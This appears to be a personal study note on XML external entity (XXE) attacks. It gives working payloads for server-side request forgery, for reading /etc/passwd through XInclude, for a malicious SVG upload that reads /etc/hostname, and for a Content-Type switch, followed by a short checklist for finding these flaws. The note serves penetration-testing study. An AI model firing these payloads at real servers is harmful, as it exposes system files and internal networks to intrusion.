# Exploiting [[XXE]] to perform [[SSRF]] attacks
Example:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
<foo>
	<bar>
		&xxe;
	</bar>
</foo>
```

# XInclude attacks
You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document. 
Example:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
By default, `xi:include` parses document as xml. `parse` attribute must be specified.
Full example:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

# Attack via [[File Upload]]
Examples of XML-based formats are office document formats like DOCX and image formats like SVG. 
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
If uploaded, it will draw hostname content on svg image.

# Attack via modified Content-Type
Try to change `Content-Type` to `application/xml` and the data:
```
foo=bar
```
to
```
<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

# How to find and test for XXE vulnerabilities
* Test for file retrieval by defining an external entity
* Testing for Blind XXE using #burp Collaborator
* Try XInclude if full XML is not presented
* [[XSS]], [[SQLi]], obfuscated to bypass the defence
